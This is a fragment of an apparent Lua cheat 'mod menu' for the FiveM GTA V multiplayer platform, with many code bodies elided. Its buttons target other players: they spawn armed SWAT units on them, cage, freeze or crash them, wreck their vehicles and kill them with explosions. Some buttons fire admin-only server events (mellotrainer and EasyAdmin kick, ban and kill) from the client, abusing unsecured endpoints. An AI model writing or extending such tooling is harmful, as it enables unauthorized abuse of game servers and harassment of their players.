                    if LoL.Button ("Fake Chat Message") then
				...
				elseif LoL.Button("Spawn Mountain Lion") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 10 do
                ...
                elseif LoL.Button("~h~~r~Spawn ~s~Swat army with ~y~AK") then
					...
					elseif LoL.Button("~h~~r~Spawn ~s~Swat army with ~y~RPG") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_rpg"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
                ...
                elseif LoL.Button("~h~~r~Spawn ~s~Swat army with ~y~Flaregun") then
                    local bQ = "s_m_y_swat_01"
                ...
                elseif LoL.Button("~h~~r~Spawn ~s~Swat army with ~y~Railgun") then
                    local bQ = "s_m_y_swat_01"
                    local bR = "weapon_railgun"
                    for i = 0, 10 do
                        local bK = GetEntityCoords(GetPlayerPed(SelectedPlayer))
				   ...
				   elseif LoL.Button("Cage Player 2") then
                   freezePlayer = true
                   Citizen.Wait(10)
                   SpawnObjOnPlayer(GetHashKey("prop_gascage01"))
                   freezePlayer = false
                    elseif LoL.Button("Cage Player") then
					...
					elseif LoL.Button("~b~Fuck Engine ~r~NEW") then
                 ...
                 elseif LoL.Button('~h~~o~_!_ ~r~CRASH ~s~Player ~o~_!_') then
                ...
                elseif LoL.Button('~h~~r~Banana ~p~Party') then
                ...
                elseif LoL.Button('~h~~r~Hamburgher ~s~Player') then
                ...
                elseif LoL.Button('~h~~r~Hamburgher ~s~Player Car') then
                    local eb = 'xs_prop_hamburgher_wl'
                    local ec = GetHashKey(eb)
                    local ed = CreateObject(ec, 0, 0, 0, true, true, true)
                    AttachEntityToEntity(
                ...
                elseif LoL.Button('~h~~r~Snowball troll ~s~Player') then
                    j = true
                    x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(SelectedPlayer)))
                    roundx = tonumber(string.format('%.2f', x))
                    roundy = tonumber(string.format('%.2f', y))
                 ...
                 elseif LoL.Button('~h~~r~Launch ~s~his car') then
 				...
 				elseif LoL.Button("~g~Revive ~b~VRP") then CreatePickup(GetHashKey("PICKUP_HEALTH_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif LoL.Button("Give ~b~Armour ") then CreatePickup(GetHashKey("PICKUP_ARMOUR_STANDARD"), GetEntityCoords(GetPlayerPed(SelectedPlayer))) elseif LoL.Button("~h~~r~Kill ~s~Player") then AddExplosion(GetEntityCoords(GetPlayerPed(SelectedPlayer)), 4, 1337.0, false, true, 0.0) 

 
				elseif LoL.Button("~b~Repair Vehicle ~r~NEW") then
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
				...
				elseif LoL.Button("~b~Fuck Car ~r~NEW ") then
					local playerPed = GetPlayerPed(SelectedPlayer)
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
					NetworkRequestControlOfEntity(GetVehiclePedIsIn(SelectedPlayer))
				...
				elseif LoL.Button("~r~ KILL") then
					TriggerServerEvent("mellotrainer:s_adminKill", GetPlayerServerId(SelectedPlayer))
				elseif LoL.Button("~r~ BAN") then
					TriggerServerEvent( 'mellotrainer:adminTempBan', GetPlayerServerId(SelectedPlayer))
				elseif LoL.Button("~r~ KICK") then
					TriggerServerEvent( 'mellotrainer:adminKick', GetPlayerServerId(SelectedPlayer), "SaudiDrift: You have been kicked from the server [تخريب, سب, ازعاج,ذكر اسماء سيرفرات, وحدة من ذي الأشياء" )
					TriggerServerEvent("EasyAdmin:kickPlayer", GetPlayerServerId(SelectedPlayer), "SaudiDrift: You have been kicked from the server [تخريب, سب, ازعاج,ذكر اسماء سيرفرات, وحدة من ذي الأشياء" )
                    elseif LoL.MenuButton("Spawn Props On Player", "SpawnPropsMenu") then
                    elseif LoL.CheckBox(
                        "Freeze Player",
                        freezePlayer,
                        function(enabled)
                ...
                elseif LoL.IsMenuOpened("SpawnPropsMenu") then
                    ...
                    then
                    elseif LoL.ComboBox("Bone", { "Head", "Right Hand" }, currentBone, selectedBone, function(currentIndex, selectedIndex)
                        currentBone = currentIndex
                        selectedBone = selectedIndex
                    end)
                    then
                    elseif LoL.Button("Weed") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif LoL.Button("Windmill") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    elseif LoL.Button("Custom Prop") then
                        local coords = GetEntityCoords(GetPlayerPed(SelectedPlayer), true)
                    ...
                    LoL.Display()
            elseif LoL.IsMenuOpened("VehicleRamMenu") then
                if LoL.Button("Futo") then
                ...
                elseif LoL.Button("Bus") then
                    ...
                    LoL.Display()
            elseif LoL.IsMenuOpened("SingleWepPlayer") then
                for i = 1, #allWeapons do
                    if LoL.Button(allWeapons[i]) then
                ...
                LoL.Display()
            elseif LoL.IsMenuOpened("WeaponMenu") then
                if LoL.MenuButton("~r~SINGLE WEAPON SPAWNER", "SingleWeaponMenu") then
                elseif LoL.Button("~r~GIVE ALL WEAPONS") then
                    for i = 1, #allWeapons do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                elseif LoL.Button("~r~DELETE ALL WEAPONS") then
                    for i = 1, #allWeapons do
                        RemoveAllPedWeapons(PlayerPedId(), true)
                    end
                elseif LoL.Button("~r~GIVE AMMO") then
                    for i = 1, #allWeapons do
                ...
                then
                elseif LoL.MenuButton("~b~WEAPON SETTINGS", "WeaponCustomization") then
                elseif LoL.MenuButton("~r~Bullet GUN SETTINGS", "BulletGunMenu") then
                end

                LoL.Display()
            elseif LoL.IsMenuOpened("WeaponCustomization") then
                if LoL.CheckBox(
                    "Rainbow Tint",
                    rainbowTint,
                    function(enabled)
                ...
                then
                elseif LoL.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currentTint, selectedTint, function(currentIndex, selectedIndex)
                ...
                then
                elseif LoL.Button("~g~Add Special Finish") then
                ...
                elseif LoL.Button("~r~Remove Special Finish") then
                ...
                elseif LoL.Button("~g~Add Suppressor") then
                ...
                elseif LoL.Button("~r~Remove Suppressor") then
                ...
                elseif LoL.Button("~g~Add Scope") then
                ...
                elseif LoL.Button("~r~Remove Scope") then
                ...
                LoL.Display()
            elseif LoL.IsMenuOpened("BulletGunMenu") then
                if LoL.CheckBox(
                    "Vehicle Gun",
                    vehicleGun,
                    function(enabled)
                ...
                then
                elseif LoL.ComboBox("Vehicle To Shoot", vehicles, currentVehicle, selectedVehicle, function(currentIndex, selectedIndex)
                    currentVehicle = currentIndex
                    selectedVehicle = selectedIndex

                end)
                then
                elseif LoL.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                ...
                then
                elseif LoL.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                ...
                then
                elseif LoL.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                ...
                LoL.Display()
            elseif LoL.IsMenuOpened("SingleWeaponMenu") then
                for i = 1, #allWeapons do
                    if LoL.Button(allWeapons[i]) then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
                    end
                ...
                LoL.Display()
            elseif IsDisabledControlPressed(0, 154) then
                if logged then
                    LoL.OpenMenu("MainMenu")
                else
                    local temp = KeyboardInput("Enter", "", 100)
                    if temp == pass then
